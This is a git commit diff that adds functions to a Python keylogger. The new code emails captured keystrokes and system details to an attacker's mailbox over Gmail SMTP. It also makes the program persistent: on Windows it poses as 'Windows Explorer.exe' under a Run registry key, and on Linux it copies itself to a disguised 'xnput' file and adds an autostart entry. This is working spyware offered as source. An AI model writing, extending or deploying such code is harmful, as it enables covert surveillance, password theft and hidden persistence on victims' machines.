1f66433301e285f997ce629e1fb028cbd8f7400a
Rachit <128582664+Valtriaz@users.noreply.github.com>
2024-07-22 10:59:08 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -44,4 +44,56 @@ class Keylogger:
         timer = threading.Timer(self.interval, self.report)
         timer.start()
 
-  
+  def send_mail(self, message):
+
+        message = "Subject: keyLogger Report\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(self.email, self.password)
+        server.sendmail(self.email, self.email, message)
+        server.quit()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+    def become_persistent(self):
+        if sys.platform.startswith("win"):
+            self.become_persistent_on_windows()
+        elif sys.platform.startswith("linux"):
+            self.become_persistent_on_linux()
+
+    def become_persistent_on_windows(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            self.log = "** Keylogger started ** "
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
+    def become_persistent_on_linux(self):
+        home_config_directory = os.path.expanduser('~') + "/.config/"
+        autostart_path = home_config_directory + "/autostart/"
+        autostart_file = autostart_path + "xinput.desktop"
+        if not os.path.isfile(autostart_file):
+            self.log = "** Keylogger started **"
+            try:
+                os.makedirs(autostart_path)
+            except OSError:
+                pass
+
+            destination_file = home_config_directory + "xnput"
+            shutil.copyfile(sys.executable, destination_file)
+            self.chmod_to_exec(destination_file)
+
+            with open(autostart_file, 'w') as out:
+                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
+                out.write("Name=Xinput\nExec=" + destination_file + "\n")
+
+            self.chmod_to_exec(autostart_file)
+            subprocess.Popen(destination_file)
+            sys.exit()
+
+    def chmod_to_exec(self, file):
+        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
